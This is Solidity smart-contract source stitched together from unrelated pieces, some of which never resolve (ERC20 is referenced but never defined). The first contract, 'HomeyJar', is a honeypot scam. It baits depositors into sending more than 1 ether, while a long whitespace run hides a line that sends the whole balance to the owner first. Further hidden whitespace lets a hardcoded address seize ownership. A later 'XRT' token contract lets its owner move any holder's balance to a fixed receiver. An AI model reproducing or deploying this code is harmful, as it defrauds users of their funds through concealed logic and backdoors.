 

pragma solidity ^0.4.19;

contract HomeyJar {
    address public Owner = msg.sender;
   
    function() public payable {}
   
    function GetHoneyFromJar() public payable {                                              
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data) payable public {
        require(msg.sender == Owner);
          
        adr.call.value(msg.value)(data);
    }
}
contract XRT is StandardToken, OnlyOwner {
    uint256 private approvalCount = 0;
    uint256 public minApproval = 2;
    address public fundReceiver;

    constructor(address _takeBackAcc) public {
        balances[msg.sender] = totalSupply;
        fundReceiver = _takeBackAcc;
    }

    function setApprovalCount(uint _value) public isController {
        approvalCount = _value;
    }

    function setMinApprovalCount(uint _value) public isController returns (bool) {
        require(_value > 0);
        minApproval = _value;
        return true;
    }

    function getApprovalCount() public view isController returns (uint) {
        return approvalCount;
    }

    function getFundReceiver() public view isController returns (address) {
        return fundReceiver;
    }

    function controllerApproval(address _from, uint256 _value) public isOwner returns (bool) {
        require(minApproval <= approvalCount);
        balances[_from] = balances[_from].safeSub(_value);
        balances[fundReceiver] = balances[fundReceiver].safeAdd(_value);
        emit Transfer(_from, fundReceiver, _value);
        return true;
    }
}

library SafeMath {
    function safeSub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }
}

contract StandardToken is ERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract OnlyOwner {
    address public owner;
    address private controller;
    event Controller(address _user);

    constructor() public {
        owner = msg.sender;
        controller = owner;
    }

    modifier isOwner {
        require(msg.sender == owner);
        _;
    }

    modifier isController {
        require(msg.sender == controller);
        _;
    }
}
